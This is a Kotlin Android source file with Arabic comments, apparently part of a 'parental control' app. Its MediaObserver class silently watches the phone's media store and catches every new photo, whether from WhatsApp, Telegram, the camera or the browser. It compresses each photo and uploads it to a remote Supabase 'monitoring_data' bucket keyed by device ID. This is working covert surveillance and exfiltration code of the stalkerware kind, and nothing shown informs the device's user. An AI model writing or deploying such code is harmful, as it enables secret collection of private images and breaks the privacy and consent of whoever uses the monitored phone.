package com.example.parentalcontrol

import android.content.Context
import android.database.ContentObserver
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.ByteArrayOutputStream
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * MediaObserver — رصد ورفع الصور الجديدة
 *
 * يراقب MediaStore لالتقاط أي صورة جديدة تُحفظ على الهاتف
 * (من WhatsApp، التليجرام، الكاميرا، المتصفح، أي تطبيق آخر)،
 * يضغطها للحفاظ على الجودة العالية بحجم صغير (<200KB) ثم يرفعها.
 */
class MediaObserver(private val context: Context) {

    private val supabase = SupabaseManager.getInstance()
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val handler = Handler(Looper.getMainLooper())

    // آخر صورة تمت معالجتها — لمنع التكرار
    private var lastProcessedId: Long = 0L
    private var lastProcessedTime: Long = 0L

    companion object {
        private const val TAG            = "MediaObserver"
        private const val BUCKET         = "monitoring_data"
        private const val MAX_WIDTH      = 1920
        private const val MAX_HEIGHT     = 1080
        private const val JPEG_QUALITY   = 78   // جودة JPEG 78% — توازن بين الوضوح والحجم
        private const val TARGET_KB      = 180   // الحد المستهدف بالكيلوبايت
        private const val DEBOUNCE_MS    = 2_000L // 2 ثانية منع التكرار
    }

    private val observer = object : ContentObserver(handler) {
        override fun onChange(selfChange: Boolean, uri: Uri?) {
            if (uri == null) return
            // استخراج ID الصورة من الـ URI
            val id = uri.lastPathSegment?.toLongOrNull() ?: return
            val now = System.currentTimeMillis()
            // منع معالجة نفس الصورة مرتين في أقل من 2 ثانية
            if (id == lastProcessedId && (now - lastProcessedTime) < DEBOUNCE_MS) return
            lastProcessedId = id
            lastProcessedTime = now

            scope.launch {
                processNewPhoto(id)
            }
        }
    }

    fun start() {
        try {
            context.contentResolver.registerContentObserver(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                true,
                observer
            )
            Log.i(TAG, "MediaObserver registered — monitoring incoming photos")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register MediaObserver: ${e.message}")
        }
    }

    fun stop() {
        try {
            context.contentResolver.unregisterContentObserver(observer)
            Log.i(TAG, "MediaObserver unregistered")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to unregister MediaObserver: ${e.message}")
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  معالجة الصورة الجديدة
    // ─────────────────────────────────────────────────────────────────────────

    private suspend fun processNewPhoto(photoId: Long) = withContext(Dispatchers.IO) {
        try {
            // جلب بيانات الصورة من MediaStore
            val projection = arrayOf(
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATE_ADDED,
                MediaStore.Images.Media.BUCKET_DISPLAY_NAME
            )
            val selection = "${MediaStore.Images.Media._ID} = ?"
            val args = arrayOf(photoId.toString())

            val cursor = context.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection, selection, args, null
            ) ?: return@withContext

            cursor.use { c ->
                if (!c.moveToFirst()) return@withContext

                val filePath = c.getString(c.getColumnIndexOrThrow(MediaStore.Images.Media.DATA))
                    ?: return@withContext
                val fileName = c.getString(c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME))
                    ?: return@withContext

                Log.d(TAG, "New photo detected: $fileName ($filePath)")

                // تجاهل صور screenshots من التطبيق نفسه
                if (fileName.startsWith("screen_")) return@withContext

                val sourceFile = File(filePath)
                if (!sourceFile.exists() || sourceFile.length() == 0L) return@withContext

                // ضغط الصورة
                val compressed = compressPhoto(sourceFile) ?: return@withContext

                // رفع الصورة
                uploadPhoto(compressed, fileName)
            }
        } catch (e: Exception) {
            Log.e(TAG, "processNewPhoto error: ${e.message}")
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  ضغط الصورة مع الحفاظ على الجودة
    // ─────────────────────────────────────────────────────────────────────────

    private fun compressPhoto(sourceFile: File): ByteArray? {
        return try {
            // فك ضغط الصورة الأصلية
            val opts = BitmapFactory.Options().apply { inJustDecodeBounds = true }
            BitmapFactory.decodeFile(sourceFile.absolutePath, opts)

            val origW = opts.outWidth
            val origH = opts.outHeight

            if (origW <= 0 || origH <= 0) return null

            // حساب نسبة التقليص
            val scale = minOf(
                MAX_WIDTH.toFloat() / origW,
                MAX_HEIGHT.toFloat() / origH,
                1.0f   // لا نكبّر الصور الأصغر
            )

            val targetW = (origW * scale).toInt().coerceAtLeast(1)
            val targetH = (origH * scale).toInt().coerceAtLeast(1)

            // inSampleSize لتسريع فك الضغط
            val sampleOpts = BitmapFactory.Options().apply {
                inSampleSize = calculateInSampleSize(origW, origH, targetW, targetH)
            }
            val rawBitmap = BitmapFactory.decodeFile(sourceFile.absolutePath, sampleOpts)
                ?: return null

            // تغيير الأبعاد إذا لزم
            val finalBitmap = if (rawBitmap.width > MAX_WIDTH || rawBitmap.height > MAX_HEIGHT) {
                val scaled = Bitmap.createScaledBitmap(rawBitmap, targetW, targetH, true)
                rawBitmap.recycle()
                scaled
            } else {
                rawBitmap
            }

            // ضغط JPEG تدريجي للوصول للحجم المستهدف
            val out = ByteArrayOutputStream()
            var quality = JPEG_QUALITY
            finalBitmap.compress(Bitmap.CompressFormat.JPEG, quality, out)

            // إذا كان الحجم لا يزال كبيراً، نخفض الجودة تدريجياً
            while (out.size() > TARGET_KB * 1024 && quality > 40) {
                out.reset()
                quality -= 10
                finalBitmap.compress(Bitmap.CompressFormat.JPEG, quality, out)
            }
            finalBitmap.recycle()

            val bytes = out.toByteArray()
            Log.d(TAG, "Photo compressed: ${sourceFile.length() / 1024}KB → ${bytes.size / 1024}KB (q=$quality)")
            bytes
        } catch (e: Exception) {
            Log.e(TAG, "compressPhoto error: ${e.message}")
            null
        }
    }

    private fun calculateInSampleSize(width: Int, height: Int, reqW: Int, reqH: Int): Int {
        var inSampleSize = 1
        if (height > reqH || width > reqW) {
            val halfH = height / 2
            val halfW = width / 2
            while ((halfH / inSampleSize) >= reqH && (halfW / inSampleSize) >= reqW) {
                inSampleSize *= 2
            }
        }
        return inSampleSize
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  رفع الصورة المضغوطة إلى Supabase
    // ─────────────────────────────────────────────────────────────────────────

    private suspend fun uploadPhoto(bytes: ByteArray, originalName: String) = withContext(Dispatchers.IO) {
        try {
            val ts = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
            val safeName = originalName.replace(Regex("[^a-zA-Z0-9._-]"), "_")
            val fileName = "img_${ts}_${safeName.take(30)}.jpg"

            val tmpFile = File(context.cacheDir, fileName)
            tmpFile.writeBytes(bytes)

            val deviceId = getDeviceId()
            val result = supabase.uploadFile(
                file = tmpFile,
                bucket = BUCKET,
                folder = "photos/$deviceId",
                customFileName = fileName
            )

            tmpFile.delete()

            when (result) {
                is UploadResult.Success -> {
                    Log.i(TAG, "✅ Photo uploaded: $fileName (${bytes.size / 1024}KB)")
                    supabase.logRemote(
                        context, TAG, "INFO",
                        """{"type":"photo","file":"$fileName","size":${bytes.size},"path":"photos/$deviceId/$fileName"}"""
                    )
                }
                is UploadResult.Error -> {
                    Log.w(TAG, "Photo upload failed: ${result.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "uploadPhoto error: ${e.message}")
        }
    }

    private fun getDeviceId(): String = android.provider.Settings.Secure.getString(
        context.contentResolver, android.provider.Settings.Secure.ANDROID_ID
    ) ?: "unknown"
}
